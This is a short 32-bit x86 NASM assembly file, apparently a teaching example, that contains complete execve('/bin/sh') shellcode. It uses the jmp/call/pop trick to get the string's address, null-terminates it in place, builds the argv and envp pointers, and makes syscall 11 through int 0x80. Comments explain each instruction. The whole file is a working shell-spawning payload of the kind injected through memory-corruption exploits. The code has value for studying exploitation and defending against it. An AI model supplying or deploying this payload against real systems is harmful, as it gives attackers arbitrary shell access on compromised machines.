BITS 32

	jmp short two		; jumps down to the bottom for call trick
	
	one:
	; int execve(const char *filename, char *const argv[], char *const envp[])
	pop ebx 				; Ebx has the addr of the sring
	xor eax, eax		; Put 0 into eax
	mov [ebx+7], al	; Nul lterminate the /bin/sh string
	mov [ebx+8], ebx	; Put addr from ebx where the AAAA is
	mov [ebx+12], eax ; Put 32bit null terminate where the BBBB is
	lea ecx, [ebx+8]	; load the address of [ebx + 8] into ecx for argv ptr
	lea edx, [ebx+12]	; edx = ebx + 12, which is the envp ptr
	mov al, 11				; syscall #11
	int 0x80					; do it

two:
	call one				; use a call to get string address
	db '/bin/shXAAAABBBB'	; the XAAAABBBB aren't needed
